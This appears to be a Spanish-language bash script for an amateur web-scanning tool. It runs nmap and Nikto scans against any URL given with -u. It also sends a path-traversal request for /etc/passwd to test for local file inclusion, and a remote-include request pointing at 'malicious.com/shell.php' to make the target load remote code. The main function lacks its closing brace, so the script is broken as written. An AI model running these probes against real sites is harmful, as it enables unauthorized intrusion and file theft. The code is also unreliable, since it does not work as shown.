#!/bin/bash

# Función para mostrar el banner
show_banner() {
  echo "--------------------------------------"
  echo "| w3bscantool2.0.sh                     |"
  echo "| Herramienta de Escaneo Web         |"
  echo "| Hecho por Root/user/47363          |"
  echo "--------------------------------------"
  echo ""
}

# Función para instalar dependencias
install_deps() {
  echo "Instalando dependencias..."

  # Detectar sistema operativo
  if [ -f /etc/debian_version ]; then
    # Debian, Ubuntu
    sudo apt-get update
    sudo apt-get install -y nmap nikto
  elif [ -f /etc/redhat-release ]; then
    # Red Hat, CentOS, Fedora
    sudo yum update
    sudo yum install -y nmap nikto
  elif [ -f /etc/arch-release ]; then
    # Arch Linux
    sudo pacman -Syu nmap nikto
  else
    echo "Error: No se pudo detectar el sistema operativo. Por favor, instale manualmente las siguientes dependencias: nmap, nikto."
    exit 1
  fi
}

# Función para escanear vulnerabilidades LFI
scan_lfi() {
  echo "Escaneando vulnerabilidades LFI en $url..."
  curl -s "$url?page=../../../../../../../../etc/passwd" | grep -q "root:x:0:0"
  if [ $? -eq 0 ]; then
    echo "Vulnerabilidad LFI encontrada: es posible leer archivos del sistema."
  else
    echo "No se encontraron vulnerabilidades LFI."
  fi
}

# Función para escanear vulnerabilidades RFI
scan_rfi() {
  echo "Escaneando vulnerabilidades RFI en $url..."
  curl -s "$url?page=http://malicious.com/shell.php" | grep -q "Hello, world!"
  if [ $? -eq 0 ]; then
    echo "Vulnerabilidad RFI encontrada: es posible ejecutar código remoto."
  else
    echo "No se encontraron vulnerabilidades RFI."
  fi
}

# Función principal
main() {

  # Mostrar banner
  show_banner

  # Verificar si las dependencias están instaladas
  if ! command -v nmap >/dev/null 2>&1 || ! command -v nikto >/dev/null 2>&1; then
    echo "Algunas de las dependencias necesarias no están instaladas."
    read -p "¿Desea instalarlas ahora? (s/n) " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Ss]$ ]]; then
      install_deps
    else
      echo "Error: Las dependencias necesarias no están instaladas."
      exit 1
    fi
  fi

  # Obtener la URL del sitio web objetivo desde el argumento -u
  while getopts "u:" option; do
    case "${option}" in
      u)
        url=${OPTARG}
        ;;
    esac
  done

  # Verificar si se proporcionó una URL
  if [ -z "$url" ]; then
    echo "Error: no se proporcionó una URL. Por favor, use la opción -u para especificar la URL del sitio web objetivo."
    exit 1
  fi

  # Leer la opción de escaneo del usuario
echo "Seleccione una opción:"
echo "1) Escaneo rápido de puertos"
echo "2) Escaneo de puertos y servicios"
echo "3) Escaneo de vulnerabilidades con Nikto"
echo "4) Escaneo de vulnerabilidades LFI y RFI"
read -p "> " scan_option

# Realizar el escaneo seleccionado por el usuario
case "$scan_option" in
  1)
    echo "Realizando escaneo rápido de puertos en $url..."
    nmap -F $url
    ;;
  2)
    echo "Realizando escaneo de puertos y servicios en $url..."
    nmap -sV $url
    ;;
  3)
    echo "Realizando escaneo de vulnerabilidades con Nikto en $url..."
    nikto -h $url
    ;;
  4)
    scan_lfi
    scan_rfi
    ;;
  *)
    echo "Opción inválida. Saliendo."
    exit 1
    ;;
esac

# Llamar a la función principal con paréntesis
main "$@"
